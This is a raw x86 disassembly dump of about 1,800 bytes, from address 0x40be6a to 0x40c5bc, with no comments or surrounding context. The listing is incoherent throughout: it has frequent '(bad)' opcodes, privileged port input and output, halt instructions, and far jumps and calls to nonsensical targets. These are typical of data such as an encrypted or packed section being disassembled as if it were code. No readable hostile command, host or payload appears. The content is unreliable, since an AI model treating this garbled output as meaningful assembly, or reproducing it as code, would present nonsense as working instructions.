  40be6a:	xlat   BYTE PTR ds:[ebx]
  40be6b:	mov    ah,BYTE PTR [esi]
  40be6d:	push   0x887e8967
  40be72:	in     eax,dx
  40be73:	fild   QWORD PTR cs:[ecx]
  40be76:	adc    ah,dh
  40be78:	lahf   
  40be79:	xchg   BYTE PTR [edi-0x6b],al
  40be7c:	add    al,0xac
  40be7e:	mov    BYTE PTR [esi+eiz*1-0x2e],ah
  40be82:	hlt    
  40be83:	in     al,0x0
  40be85:	jb     0x40be6a
  40be87:	test   BYTE PTR [ecx],al
  40be89:	imul   ebx,DWORD PTR [edi],0x2ebcbb6d
  40be8f:	mov    esi,0x94f42bfb
  40be94:	push   edx
  40be95:	xor    al,0xa2
  40be97:	xchg   ebp,eax
  40be98:	ins    DWORD PTR es:[edi],dx
  40be99:	loop   0x40be30
  40be9b:	xlat   BYTE PTR ds:[ebx]
  40be9c:	jp     0x40be6d
  40be9e:	sar    DWORD PTR [edx+0x6d],0x32
  40bea2:	(bad)  
  40bea3:	stos   DWORD PTR es:[edi],eax
  40bea4:	test   DWORD PTR [edx+0x66],0x58484e8
  40beab:	xchg   ebp,eax
  40beac:	pop    edi
  40bead:	into   
  40beae:	cmc    
  40beaf:	aaa    
  40beb0:	dec    esp
  40beb1:	aam    0x9e
  40beb3:	jno    0x40bea2
  40beb5:	not    DWORD PTR [esi-0x6f621dca]
  40bebb:	gs aam 0xe6
  40bebe:	bound  edx,QWORD PTR [bp+di-0x686a]
  40bec3:	mov    cl,0x17
  40bec5:	xchg   esi,eax
  40bec6:	xchg   ebp,eax
  40bec7:	pushf  
  40bec8:	out    dx,al
  40bec9:	pop    ebx
  40beca:	push   es
  40becb:	cdq    
  40becc:	lds    edx,FWORD PTR [edi+0x40]
  40becf:	ficom  WORD PTR [eax]
  40bed1:	cmp    esp,DWORD PTR [ecx-0x23]
  40bed4:	adc    DWORD PTR [edx+0x6458c478],ebp
  40beda:	sub    DWORD PTR [edx+eiz*1],esp
  40bedd:	ins    DWORD PTR es:[edi],dx
  40bede:	loope  0x40be68
  40bee0:	daa    
  40bee1:	std    
  40bee2:	mov    ch,0x3c
  40bee4:	sub    bh,BYTE PTR [edi-0x60]
  40bee7:	push   es
  40bee8:	xor    ebx,DWORD PTR [ebp-0x2de77691]
  40beee:	je     0x40becb
  40bef0:	adc    eax,0x269cff9a
  40bef5:	movnti DWORD PTR [ecx],esp
  40bef8:	sahf   
  40bef9:	or     edx,DWORD PTR [ebx+0x16]
  40befc:	ror    eax,1
  40befe:	jge    0x9ee8f5c9
  40bf04:	addr16 lahf 
  40bf06:	xor    BYTE PTR [edi],ch
  40bf08:	div    DWORD PTR [eax]
  40bf0a:	(bad)  
  40bf0b:	mov    bh,0x9b
  40bf0d:	das    
  40bf0e:	sub    eax,0xcc982406
  40bf13:	sub    eax,edx
  40bf15:	add    DWORD PTR [edi],esi
  40bf17:	test   al,0x25
  40bf19:	push   ecx
  40bf1a:	mov    ecx,0x17fe39f1
  40bf1f:	xchg   ecx,eax
  40bf20:	and    DWORD PTR [edx],edi
  40bf22:	mov    al,ds:0xb331678f
  40bf27:	les    esp,FWORD PTR ds:0xbd44d14e
  40bf2d:	sub    edi,DWORD PTR [esi]
  40bf2f:	gs arpl bx,di
  40bf32:	mov    al,0x7e
  40bf34:	std    
  40bf35:	lock (bad) [esi+0x58]
  40bf39:	pusha  
  40bf3a:	sub    esi,0x31
  40bf3d:	push   ss
  40bf3e:	inc    esp
  40bf3f:	ret    
  40bf40:	popa   
  40bf41:	jmp    0x459f:0x3c74f05a
  40bf48:	popa   
  40bf49:	xchg   esi,eax
  40bf4a:	es mov esp,0x35535102
  40bf50:	cmp    cl,BYTE PTR [ecx-0x42c3f807]
  40bf56:	mov    WORD PTR [edi+0x5b],?
  40bf59:	mov    ebp,0x576d72b7
  40bf5e:	cwde   
  40bf5f:	jl     0x40bef6
  40bf61:	adc    DWORD PTR [ebp+0x2093cc48],esi
  40bf67:	pop    esp
  40bf68:	retf   0xc5eb
  40bf6b:	es sub ah,0x4d
  40bf6f:	mov    dh,BYTE PTR [ecx+0x3d78b0eb]
  40bf75:	pop    es
  40bf76:	lods   eax,DWORD PTR ds:[esi]
  40bf77:	(bad)  
  40bf78:	outs   dx,BYTE PTR ds:[esi]
  40bf79:	inc    ecx
  40bf7a:	cmp    esp,DWORD PTR [ebp+0x17]
  40bf7d:	mov    dh,0xaa
  40bf7f:	push   0x54
  40bf81:	stc    
  40bf82:	pop    esi
  40bf83:	and    eax,0x1b1cffc3
  40bf88:	jb     0x40c003
  40bf8a:	inc    ebp
  40bf8b:	mov    WORD PTR [ecx+ebp*4-0x2b3b8be4],cs
  40bf92:	clc    
  40bf93:	pop    edx
  40bf94:	hlt    
  40bf95:	mov    ecx,DWORD PTR [edi]
  40bf97:	ss int3 
  40bf99:	push   0x5c424255
  40bf9e:	xor    al,0x85
  40bfa0:	call   0x237a:0xe7ee3738
  40bfa7:	into   
  40bfa8:	push   eax
  40bfa9:	xchg   ebx,eax
  40bfaa:	addr16 add al,0xeb
  40bfad:	ret    0xc47a
  40bfb0:	outs   dx,DWORD PTR ds:[esi]
  40bfb1:	cmp    BYTE PTR [eax],ch
  40bfb3:	jne    0x40c031
  40bfb5:	das    
  40bfb6:	and    bh,BYTE PTR [edi]
  40bfb8:	shl    DWORD PTR [eax],0x6
  40bfbb:	xor    dh,BYTE PTR [edx*2-0x67f08f4b]
  40bfc2:	push   ss
  40bfc3:	cmovo  edi,DWORD PTR [ebx+0x7d]
  40bfc7:	cmp    eax,DWORD PTR [edx+eiz*4-0x2e]
  40bfcb:	add    cl,BYTE PTR [ebx+0x7579e46]
  40bfd1:	inc    DWORD PTR [esi]
  40bfd3:	and    ch,bh
  40bfd5:	dec    ebx
  40bfd6:	les    esp,FWORD PTR ds:0x6fd0
  40bfdb:	in     eax,0x7a
  40bfdd:	mov    edx,0xaf773b21
  40bfe2:	adc    edi,DWORD PTR [ebx-0x2e]
  40bfe5:	enter  0xd6d7,0x9d
  40bfe9:	icebp  
  40bfea:	sub    ch,BYTE PTR [edi+0xadabce2]
  40bff0:	(bad)  
  40bff1:	lods   al,BYTE PTR ds:[esi]
  40bff2:	xor    ah,dl
  40bff4:	adc    DWORD PTR [edx+ecx*8],esi
  40bff7:	mov    dl,BYTE PTR ds:0x849b44c3
  40bffd:	or     DWORD PTR [edx+0xac13842],ebx
  40c003:	clc    
  40c004:	mov    edi,0xb607ead3
  40c009:	push   ebp
  40c00a:	push   eax
  40c00b:	aam    0xc4
  40c00d:	xor    eax,0x136de17c
  40c012:	mov    WORD PTR ds:0x7c9914f7,ds
  40c018:	aam    0xba
  40c01a:	add    esi,DWORD PTR [eax-0x22]
  40c01d:	mov    bl,0x15
  40c01f:	dec    edi
  40c020:	dec    eax
  40c021:	fbld   TBYTE PTR [ebx-0x5f]
  40c024:	int    0x50
  40c026:	pop    eax
  40c027:	imul   esp,esi,0x63
  40c02a:	add    cl,BYTE PTR [esi+edi*2-0x7c]
  40c02e:	cmp    DWORD PTR [ecx],eax
  40c030:	(bad)  
  40c031:	sbb    al,0x54
  40c033:	sub    eax,0x975c0376
  40c038:	mov    ah,0xbf
  40c03a:	inc    esp
  40c03b:	mov    esp,0xa33adcec
  40c040:	arpl   WORD PTR ds:0xeb09dd5,dx
  40c046:	in     eax,0xe1
  40c048:	mov    esp,DWORD PTR ds:0xed78308b
  40c04e:	lods   al,BYTE PTR ds:[esi]
  40c04f:	mov    dh,0x71
  40c051:	xchg   DWORD PTR [edi+0x598e0eb1],ebp
  40c057:	bound  ecx,QWORD PTR [ecx+0x33a25207]
  40c05d:	push   cs
  40c05e:	shl    DWORD PTR [ebx-0x66],cl
  40c061:	stos   BYTE PTR es:[edi],al
  40c062:	loope  0x40c06f
  40c064:	dec    edi
  40c065:	push   ds
  40c066:	jecxz  0x40c0c6
  40c068:	dec    cx
  40c06a:	sbb    eax,0xa62fbf1
  40c06f:	mov    ch,0xb4
  40c071:	leave  
  40c072:	ins    DWORD PTR es:[edi],dx
  40c073:	and    bh,dl
  40c075:	(bad)  
  40c077:	xchg   ebx,eax
  40c078:	test   eax,0xb2c0f0dd
  40c07d:	fmulp  st(7),st
  40c07f:	loope  0x40c0ed
  40c081:	inc    ecx
  40c082:	sub    cl,BYTE PTR [esi]
  40c084:	sbb    ecx,edi
  40c086:	sub    dh,cl
  40c088:	mov    edx,DWORD PTR [ebx+0x76]
  40c08b:	jo     0x40c050
  40c08d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c08e:	xchg   edi,eax
  40c08f:	fdiv   st,st(1)
  40c091:	stos   BYTE PTR es:[edi],al
  40c092:	into   
  40c093:	or     DWORD PTR [edx+0x2e5fa828],edi
  40c099:	inc    ebp
  40c09a:	and    DWORD PTR [edi-0x11],esi
  40c09d:	cmp    bl,0xc4
  40c0a0:	push   es
  40c0a1:	pop    ebx
  40c0a2:	xor    ecx,DWORD PTR [eax]
  40c0a4:	out    dx,eax
  40c0a5:	push   ecx
  40c0a6:	or     al,0x3
  40c0a8:	push   esp
  40c0a9:	mov    cl,0xe9
  40c0ab:	push   ecx
  40c0ac:	aas    
  40c0ad:	mov    BYTE PTR [ecx-0xf],0x33
  40c0b1:	jle    0x40c0a0
  40c0b3:	popa   
  40c0b4:	or     bh,BYTE PTR [edx+0x3c]
  40c0b7:	lahf   
  40c0b8:	xor    BYTE PTR [ecx],cl
  40c0ba:	push   ebx
  40c0bb:	mov    cl,0xaa
  40c0bd:	push   edi
  40c0be:	loopne 0x40c0dd
  40c0c0:	push   ss
  40c0c1:	cdq    
  40c0c2:	scas   al,BYTE PTR es:[edi]
  40c0c3:	sub    cl,bl
  40c0c5:	nop
  40c0c6:	(bad)  
  40c0c7:	mov    ds:0xb65d4fc2,al
  40c0cc:	div    DWORD PTR [ebx-0x243d61f4]
  40c0d2:	les    edx,FWORD PTR [edi+0x7baad34c]
  40c0d8:	push   ebp
  40c0d9:	mov    al,ds:0xa78577ff
  40c0de:	dec    ebp
  40c0df:	lods   al,BYTE PTR ds:[esi]
  40c0e0:	mov    eax,0xa0eb8db6
  40c0e5:	(bad)  [ecx-0x51]
  40c0e8:	xor    cl,ah
  40c0ea:	ret    0x69b5
  40c0ed:	pushf  
  40c0ee:	fadd   DWORD PTR [edx-0x3a52523f]
  40c0f4:	cdq    
  40c0f5:	xchg   ecx,eax
  40c0f6:	call   0xe2a19a2f
  40c0fb:	das    
  40c0fc:	push   ebx
  40c0fd:	sbb    eax,0x90765fe1
  40c102:	mov    ebp,0x2e021183
  40c107:	inc    ebp
  40c108:	mov    es,WORD PTR [eax]
  40c10a:	paddusw mm4,QWORD PTR [edx-0x1c]
  40c10e:	mov    ebp,0xaadf93b8
  40c113:	pop    ecx
  40c114:	pop    ss
  40c115:	fmul   st(4),st
  40c117:	rcl    DWORD PTR [ecx+0xded8622],1
  40c11d:	scas   al,BYTE PTR es:[edi]
  40c11e:	inc    ecx
  40c11f:	adc    al,0xba
  40c121:	pop    esp
  40c122:	imul   esp,edi,0xffffffda
  40c125:	or     al,0x33
  40c127:	daa    
  40c128:	test   BYTE PTR [ebp-0x75953553],dh
  40c12e:	push   ss
  40c12f:	js     0x40c11b
  40c131:	imul   esp,DWORD PTR [edx+0xa],0x6e
  40c135:	ss (bad) 
  40c137:	outs   dx,BYTE PTR ds:[esi]
  40c138:	push   0xffffffc4
  40c13a:	adc    eax,0x6a804a45
  40c13f:	iret   
  40c140:	adc    BYTE PTR [ebx-0x70bd14f],dh
  40c146:	dec    DWORD PTR gs:[ebx-0x6]
  40c14a:	mov    dh,0xcf
  40c14c:	(bad)  
  40c14d:	lods   al,BYTE PTR ds:[esi]
  40c14e:	xchg   DWORD PTR ds:0xd95f1304,ecx
  40c154:	xlat   BYTE PTR ds:[ebx]
  40c155:	repnz inc DWORD PTR [edi-0x5d]
  40c159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c15a:	fdivr  DWORD PTR [edx-0x9028726]
  40c160:	jo     0x40c173
  40c162:	cmp    eax,0x5b898ac1
  40c167:	mov    bh,0x55
  40c169:	cli    
  40c16a:	pop    eax
  40c16b:	ffree  st(6)
  40c16d:	and    ch,BYTE PTR [edi]
  40c16f:	xchg   DWORD PTR [edi+0x4c],eax
  40c172:	hlt    
  40c173:	(bad)  
  40c175:	dec    esp
  40c176:	mov    ebx,0x3756c692
  40c17b:	add    al,0x6a
  40c17d:	retf   0x26d2
  40c180:	and    DWORD PTR [edi+edi*2],esi
  40c183:	xor    bl,cl
  40c185:	or     ah,bl
  40c187:	adc    edx,edi
  40c189:	retf   0x89b7
  40c18c:	sub    edi,eax
  40c18e:	and    BYTE PTR [edi-0x38f1f452],0x61
  40c195:	cmp    al,0x3d
  40c197:	mov    al,0x9
  40c199:	in     al,dx
  40c19a:	jmp    0x582212ec
  40c19f:	call   0x6a02ab70
  40c1a4:	mov    al,ds:0xd02e2dd8
  40c1a9:	jle    0x40c17d
  40c1ab:	lods   al,BYTE PTR ds:[esi]
  40c1ac:	push   esp
  40c1ad:	sbb    eax,0x39463d0
  40c1b2:	cmp    eax,0x6694313a
  40c1b7:	mov    eax,0x340561b4
  40c1bc:	sahf   
  40c1bd:	and    al,0x4d
  40c1bf:	aas    
  40c1c0:	std    
  40c1c1:	dec    ecx
  40c1c2:	jp     0x40c1cd
  40c1c4:	jae    0x40c15d
  40c1c6:	pop    esi
  40c1c7:	lock shl DWORD PTR [eax],cl
  40c1ca:	out    0x4f,al
  40c1cc:	sbb    edx,DWORD PTR [eax-0x13]
  40c1cf:	dec    ebp
  40c1d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1d1:	or     bl,ah
  40c1d3:	add    BYTE PTR [edi-0x3],al
  40c1d6:	inc    edi
  40c1d7:	adc    bh,BYTE PTR [edi+ecx*1]
  40c1da:	xchg   ecx,eax
  40c1db:	test   DWORD PTR [esi],0x89d0c46c
  40c1e1:	mov    dl,0xeb
  40c1e3:	pop    esi
  40c1e4:	jle    0x40c20d
  40c1e6:	add    BYTE PTR ds:0x3aa6b36d,ch
  40c1ec:	call   0x82ca:0xb84932ba
  40c1f3:	mov    ecx,0x32457416
  40c1f8:	stos   DWORD PTR es:[edi],eax
  40c1f9:	mov    dl,0x4c
  40c1fb:	push   edi
  40c1fc:	lea    ecx,[ebp-0x76af3f01]
  40c202:	sbb    al,0xa1
  40c204:	gs sahf 
  40c206:	aam    0x86
  40c208:	xchg   ebx,eax
  40c209:	jne    0x40c1f1
  40c20b:	adc    al,0x31
  40c20d:	sbb    BYTE PTR [esi-0x73ebcaaa],ch
  40c213:	mov    al,0xa1
  40c215:	fstp   st(3)
  40c217:	arpl   WORD PTR [esi+0x238a93a4],sp
  40c21d:	stos   DWORD PTR es:[edi],eax
  40c21e:	call   0x9310:0x5b9128df
  40c225:	(bad)  
  40c226:	xor    BYTE PTR [edi],ch
  40c228:	(bad)  
  40c229:	mov    eax,ds:0x27187aec
  40c22e:	or     al,0x9c
  40c230:	jge    0x40c24d
  40c232:	mov    cl,0xca
  40c234:	pusha  
  40c235:	and    ecx,DWORD PTR [esi+0x31630ba4]
  40c23b:	icebp  
  40c23c:	ret    
  40c23d:	push   es
  40c23e:	mov    ch,0xc
  40c240:	xchg   esp,eax
  40c241:	cmp    eax,0x232718ca
  40c246:	xor    esi,DWORD PTR [ecx]
  40c248:	mov    bl,0xee
  40c24a:	aad    0xfd
  40c24c:	in     al,dx
  40c24d:	push   eax
  40c24e:	mov    DWORD PTR [eax+0x12],esp
  40c251:	mov    esp,0x71fe1595
  40c256:	sti    
  40c257:	jo     0x40c26e
  40c259:	pop    ebp
  40c25a:	jne    0x40c270
  40c25c:	pop    ebx
  40c25d:	xchg   BYTE PTR [ebp-0x30],cl
  40c260:	xor    al,0x11
  40c262:	xlat   BYTE PTR ds:[ebx]
  40c263:	jae    0x40c215
  40c265:	or     eax,0xe3423dff
  40c26a:	and    ebx,DWORD PTR [ebp-0x116dcf2c]
  40c270:	test   BYTE PTR [edx+eiz*1],al
  40c273:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c274:	dec    DWORD PTR [edi-0x80]
  40c277:	ins    BYTE PTR es:[edi],dx
  40c278:	pushf  
  40c279:	mov    ebp,eax
  40c27b:	stc    
  40c27c:	nop
  40c27d:	bound  eax,QWORD PTR [edi+0x1e1bf789]
  40c283:	adc    DWORD PTR [edi+0xbbdc24a],edi
  40c289:	into   
  40c28a:	clc    
  40c28b:	push   cs
  40c28c:	add    DWORD PTR [edx-0x1200f1cc],0x33
  40c293:	std    
  40c294:	cmp    al,ch
  40c296:	pop    ebx
  40c297:	mov    dl,0xe0
  40c299:	add    al,0x49
  40c29b:	ror    BYTE PTR [esi+edi*8+0x4363db36],0x14
  40c2a3:	dec    ebp
  40c2a4:	or     DWORD PTR [ecx+edx*2+0xe0a7e43],ebx
  40c2ab:	mov    dh,0x30
  40c2ad:	sub    BYTE PTR [edx+0x6b],0xfe
  40c2b1:	imul   eax,DWORD PTR [ecx],0x899a12c9
  40c2b7:	mov    ecx,0x3ac5402
  40c2bc:	pop    esp
  40c2be:	nop
  40c2bf:	xor    ecx,DWORD PTR [edi+0x1ccd14fa]
  40c2c5:	jno    0x40c312
  40c2c7:	xor    edx,DWORD PTR [eax-0x49]
  40c2ca:	pop    eax
  40c2cb:	sub    al,0xe9
  40c2cd:	mov    WORD PTR [eax],cs
  40c2cf:	je     0x40c26e
  40c2d1:	pop    eax
  40c2d2:	xor    eax,DWORD PTR [ebx-0x26eb3de1]
  40c2d8:	fimul  DWORD PTR [eax-0x28ed03]
  40c2de:	sbb    DWORD PTR [edx],ebp
  40c2e0:	mov    esp,0x84af21a6
  40c2e5:	popf   
  40c2e6:	bound  ecx,QWORD PTR [esi+0x18]
  40c2e9:	cmp    dl,BYTE PTR [edx+0x71]
  40c2ec:	cmp    eax,0x6e3035ca
  40c2f1:	adc    eax,0xd1bb9232
  40c2f6:	mov    edi,0xf527c0a1
  40c2fb:	pop    ss
  40c2fc:	mov    bh,0x11
  40c2fe:	lods   al,BYTE PTR ds:[esi]
  40c2ff:	inc    ebp
  40c300:	and    ebp,ebp
  40c302:	mov    ebp,0xf8434880
  40c307:	ins    DWORD PTR es:[edi],dx
  40c308:	cmp    ebp,esp
  40c30a:	push   0xffffffda
  40c30c:	out    dx,al
  40c30d:	inc    esp
  40c30e:	fiadd  DWORD PTR [ecx+0x38]
  40c311:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c312:	fcmovb st,st(2)
  40c314:	aas    
  40c315:	scas   al,BYTE PTR es:[edi]
  40c316:	outs   dx,DWORD PTR ds:[esi]
  40c317:	pop    edx
  40c318:	push   esp
  40c319:	push   eax
  40c31a:	in     eax,dx
  40c31b:	nop
  40c31c:	imul   ecx,DWORD PTR [ecx-0x61],0xffffffea
  40c320:	xchg   edx,eax
  40c321:	jge    0xe856c21b
  40c327:	in     eax,0x2e
  40c329:	fbld   TBYTE PTR [edi]
  40c32b:	push   ecx
  40c32c:	inc    ecx
  40c32d:	repz inc ebx
  40c32f:	lods   al,BYTE PTR ds:[esi]
  40c330:	cmp    ebp,DWORD PTR [edi-0x7aab6cfe]
  40c336:	pop    es
  40c337:	jl     0x40c2d2
  40c339:	jmp    0xc5ee:0xadec12f2
  40c340:	push   esp
  40c341:	or     DWORD PTR [ebx-0x1a],ecx
  40c344:	div    DWORD PTR [ebx+0x2f04cbf]
  40c34a:	inc    esi
  40c34b:	cmp    ebx,eax
  40c34d:	mov    ds:0x91e2d2dc,eax
  40c352:	mov    dh,0xaa
  40c354:	xlat   BYTE PTR ds:[ebx]
  40c355:	adc    eax,0x6a566f92
  40c35a:	fst    DWORD PTR [esi]
  40c35c:	adc    al,0x4b
  40c35e:	out    0xea,eax
  40c360:	add    eax,0x4c74e55d
  40c365:	cmp    al,0x24
  40c367:	stos   DWORD PTR es:[edi],eax
  40c368:	mov    eax,ds:0xb98b803
  40c36d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c36e:	sbb    al,0x78
  40c370:	mov    ch,0x7a
  40c372:	and    DWORD PTR [ebx],ecx
  40c374:	mov    bl,BYTE PTR [esi+0x4b7342b7]
  40c37a:	fcomp  QWORD PTR [ecx]
  40c37c:	mov    ds:0x7781f726,al
  40c381:	cmc    
  40c382:	mov    al,0xb7
  40c384:	int3   
  40c385:	mov    ecx,0x6ad28742
  40c38a:	sti    
  40c38b:	rcl    BYTE PTR [ecx-0x79c66156],cl
  40c391:	push   cs
  40c392:	push   es
  40c393:	push   eax
  40c394:	call   0x1dc6316e
  40c399:	cs inc ebp
  40c39b:	jp     0x40c330
  40c39d:	jbe    0x40c348
  40c39f:	dec    eax
  40c3a0:	test   DWORD PTR [ebx+0x4a],ebp
  40c3a3:	mov    ds:0x80108909,eax
  40c3a8:	dec    ebx
  40c3a9:	rcl    DWORD PTR [eax-0x14],1
  40c3ac:	in     eax,0xdc
  40c3ae:	stos   BYTE PTR es:[edi],al
  40c3af:	adc    DWORD PTR [ecx-0x28c50788],eax
  40c3b5:	cmc    
  40c3b6:	js     0x40c398
  40c3b8:	and    al,0x62
  40c3ba:	shr    al,cl
  40c3bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3bd:	test   eax,esi
  40c3bf:	ret    
  40c3c0:	ins    BYTE PTR es:[edi],dx
  40c3c1:	add    DWORD PTR [esi+0x75],edi
  40c3c4:	pop    es
  40c3c5:	or     dl,BYTE PTR [edx]
  40c3c7:	outs   dx,DWORD PTR ds:[esi]
  40c3c8:	cmc    
  40c3c9:	inc    esi
  40c3ca:	push   esi
  40c3cb:	adc    al,BYTE PTR [ebx]
  40c3cd:	out    dx,eax
  40c3ce:	push   eax
  40c3cf:	call   0xaf8a1e70
  40c3d4:	xor    DWORD PTR [ebx],ebp
  40c3d6:	push   ebx
  40c3d7:	out    0x4e,eax
  40c3d9:	sbb    DWORD PTR [esi-0x77],edx
  40c3dc:	sbb    bh,BYTE PTR [esi-0x68]
  40c3df:	dec    esp
  40c3e0:	or     DWORD PTR [ecx+0x5743388a],ecx
  40c3e6:	popa   
  40c3e7:	(bad)  
  40c3e9:	inc    esi
  40c3ea:	pop    ss
  40c3eb:	sbb    eax,0x771ecd1f
  40c3f0:	aam    0x8
  40c3f2:	or     esi,DWORD PTR [edi+0x6e]
  40c3f5:	ins    BYTE PTR es:[edi],dx
  40c3f6:	out    dx,al
  40c3f7:	das    
  40c3f8:	add    esp,DWORD PTR [eax+eax*4+0x6e6cdba9]
  40c3ff:	dec    edi
  40c400:	sbb    DWORD PTR ds:0xbb079ee8,eax
  40c406:	es jmp 0x40c44b
  40c409:	test   ah,bl
  40c40b:	sub    DWORD PTR [esi+edi*2],ebx
  40c40e:	addr16 das 
  40c410:	jns    0x40c3d3
  40c412:	cmp    esp,DWORD PTR ds:0x64a2ce2
  40c418:	push   es
  40c419:	sbb    dl,BYTE PTR [ebx]
  40c41b:	jb     0x40c3f3
  40c41d:	inc    edx
  40c41e:	(bad)  
  40c420:	pop    ds
  40c421:	sub    BYTE PTR [edi],bl
  40c423:	inc    edi
  40c424:	pushf  
  40c425:	add    bl,cl
  40c427:	dec    edx
  40c428:	outs   dx,BYTE PTR ds:[esi]
  40c429:	ret    
  40c42a:	cwde   
  40c42b:	das    
  40c42c:	out    0x3f,al
  40c42e:	sbb    al,0x4e
  40c430:	shl    BYTE PTR [ecx],1
  40c432:	rol    BYTE PTR [ebx+edx*1-0xf],0xe4
  40c437:	lods   al,BYTE PTR ds:[esi]
  40c438:	das    
  40c439:	pop    edx
  40c43a:	cmp    eax,0xbc8d689a
  40c43f:	ja     0x40c3d2
  40c441:	aad    0x7f
  40c443:	and    al,0xd3
  40c445:	push   esp
  40c446:	loope  0x40c4bb
  40c448:	repz inc edi
  40c44a:	pop    ss
  40c44b:	iret   
  40c44c:	adc    al,BYTE PTR [edi+0x1e]
  40c44f:	ins    DWORD PTR es:[edi],dx
  40c450:	bswap  esp
  40c452:	data16 and al,0x0
  40c455:	jbe    0x40c427
  40c457:	ror    DWORD PTR ds:0x2c5daf2d,0xf2
  40c45e:	mov    ebx,0xb1c0166d
  40c463:	pop    esi
  40c464:	pop    ebp
  40c465:	adc    eax,0x8ed03aa6
  40c46a:	or     DWORD PTR [edi-0x3d269b2d],0xddb0c1f1
  40c474:	stos   DWORD PTR es:[edi],eax
  40c475:	adc    ebp,DWORD PTR [ebx]
  40c477:	jmp    0x7805:0xde89a95f
  40c47e:	daa    
  40c47f:	jno    0x40c443
  40c481:	call   0xff08b0cd
  40c486:	fsub   QWORD PTR [ebp-0x42]
  40c489:	adc    al,0xa1
  40c48b:	mov    ebx,0x7aeede90
  40c490:	push   edx
  40c491:	dec    eax
  40c492:	inc    ebx
  40c493:	ins    DWORD PTR es:[edi],dx
  40c494:	cwde   
  40c495:	pop    ecx
  40c496:	jmp    0x629174a7
  40c49b:	jns    0x40c473
  40c49d:	xor    esi,DWORD PTR [ebx-0x64]
  40c4a0:	test   ch,ah
  40c4a2:	inc    esi
  40c4a3:	inc    edx
  40c4a4:	scas   eax,DWORD PTR es:[edi]
  40c4a5:	pop    ds
  40c4a6:	lock jae 0x40c468
  40c4a9:	inc    esi
  40c4aa:	xlat   BYTE PTR ds:[ebx]
  40c4ab:	jns    0x40c46f
  40c4ad:	mov    al,ds:0x2ab3e044
  40c4b2:	xor    edx,ebp
  40c4b4:	adc    bh,ah
  40c4b6:	xchg   ecx,eax
  40c4b7:	cmp    ah,BYTE PTR [ebp-0x3f9cb2f8]
  40c4bd:	add    BYTE PTR [ebx],bh
  40c4bf:	arpl   WORD PTR ds:0x9145599,bp
  40c4c5:	or     eax,0xcafc2436
  40c4ca:	punpckhbw mm4,QWORD PTR [edi-0xc931fa8]
  40c4d1:	jp     0x40c49a
  40c4d3:	push   es
  40c4d4:	add    BYTE PTR [eax],cl
  40c4d6:	mov    ds:0xdeac0ae9,eax
  40c4db:	cld    
  40c4dc:	inc    ecx
  40c4dd:	mov    edx,0x1a74d062
  40c4e2:	adc    eax,0x3c3b6f2a
  40c4e7:	loope  0x40c496
  40c4e9:	out    dx,al
  40c4ea:	sub    DWORD PTR [edi],esi
  40c4ec:	push   es
  40c4ed:	sar    BYTE PTR [edi+0x69],0x8e
  40c4f1:	ret    
  40c4f2:	or     eax,0xaa2a1d43
  40c4f7:	les    ebp,FWORD PTR [ecx]
  40c4f9:	sbb    al,0xfa
  40c4fb:	and    ebx,DWORD PTR [ebx-0x693afad9]
  40c501:	outs   dx,DWORD PTR ds:[esi]
  40c502:	mov    fs,WORD PTR [ecx-0x79474874]
  40c508:	test   al,0x6f
  40c50a:	in     eax,0xc5
  40c50c:	pop    ebx
  40c50d:	push   ebx
  40c50e:	stos   BYTE PTR es:[edi],al
  40c50f:	add    al,0xc5
  40c511:	and    ch,al
  40c513:	clc    
  40c514:	and    ebp,ecx
  40c516:	(bad)  
  40c517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c518:	test   DWORD PTR [ecx+0x6f],esp
  40c51b:	out    0xdf,al
  40c51d:	cmp    eax,0x8ef8779
  40c522:	or     ah,BYTE PTR [ebp+eiz*1-0x6f]
  40c526:	xchg   esp,eax
  40c527:	out    0x87,eax
  40c529:	sbb    edx,ebx
  40c52b:	aam    0x3d
  40c52d:	and    bh,ah
  40c52f:	lahf   
  40c530:	xor    eax,0x9e5cfbfe
  40c535:	test   BYTE PTR [ebx],dh
  40c537:	cdq    
  40c538:	aad    0x5f
  40c53a:	aaa    
  40c53b:	lea    edx,[eax]
  40c53d:	jg     0x40c569
  40c53f:	or     DWORD PTR [ebx+ebx*2],ebx
  40c542:	or     eax,0x5f0e95dc
  40c547:	lds    edi,FWORD PTR [edx]
  40c549:	sub    al,0xce
  40c54b:	dec    edi
  40c54c:	add    ebp,DWORD PTR [edi+0x334da784]
  40c552:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c553:	(bad)  
  40c554:	aad    0x6f
  40c556:	outs   dx,BYTE PTR ds:[esi]
  40c557:	test   BYTE PTR [ebp+edx*4+0x2c],bh
  40c55b:	jo     0x40c5a3
  40c55d:	call   0xba733c91
  40c562:	pop    esp
  40c563:	xlat   BYTE PTR ds:[ebx]
  40c564:	dec    esi
  40c565:	jmp    0x604e:0xba7013de
  40c56c:	push   ds
  40c56d:	lods   eax,DWORD PTR ds:[esi]
  40c56e:	lock clc 
  40c570:	pushf  
  40c571:	mov    WORD PTR [edx+0x3f],es
  40c574:	std    
  40c575:	inc    ebx
  40c576:	mov    dh,0x62
  40c578:	cs mov edi,0x974b4cef
  40c57e:	add    DWORD PTR [edx-0x18],0x11
  40c582:	sbb    DWORD PTR [ebx-0x42e5eb5b],esi
  40c588:	ss mov al,0x23
  40c58b:	sbb    al,ch
  40c58d:	dec    edi
  40c58e:	dec    ebx
  40c58f:	bound  edi,QWORD PTR [esi-0x6f]
  40c592:	mov    eax,ds:0xb0fcf7bb
  40c597:	mov    bh,0xa0
  40c599:	xor    ch,BYTE PTR [ebx-0x3f1d4047]
  40c59f:	mov    DWORD PTR [edx+0x6022c88f],edi
  40c5a5:	and    bl,ch
  40c5a7:	mov    ebp,0x2869ba48
  40c5ac:	out    dx,eax
  40c5ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5ae:	xchg   edx,eax
  40c5af:	in     al,0x7a
  40c5b1:	mov    edx,0x677a6048
  40c5b6:	dec    esi
  40c5b7:	xchg   BYTE PTR [edx],dh
  40c5b9:	aam    0xd4
  40c5bb:	daa    
  40c5bc:	outs   dx,BYTE PTR ds:[esi]
